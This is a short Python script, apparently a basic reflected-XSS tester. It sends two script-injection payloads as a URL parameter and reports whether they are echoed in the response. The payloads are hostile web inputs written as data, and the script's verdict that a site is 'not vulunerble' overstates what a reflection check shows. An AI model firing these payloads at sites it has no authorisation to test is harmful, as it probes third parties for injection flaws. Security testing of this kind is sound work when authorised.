import requests

def test_xss(url, param):
    payloads = ["<script>alert(1)</script>", "\"><script>alert(1)</script>"]
    results = []
    for payload in payloads:
        r = requests.get(url, params={param: payload})
        print(f"Testing payload: {payload}")
        print(f"URL: {r.url}")
        print(f"Response status code: {r.status_code}")
        print(f"Response body: {r.text[:500]}") 
        if payload in r.text:
            results.append(f"Potential XSS with payload: {payload}")

    if len(results)==0:
        return ["the website is not vulunerble to xss attack"]
    else:
        return results
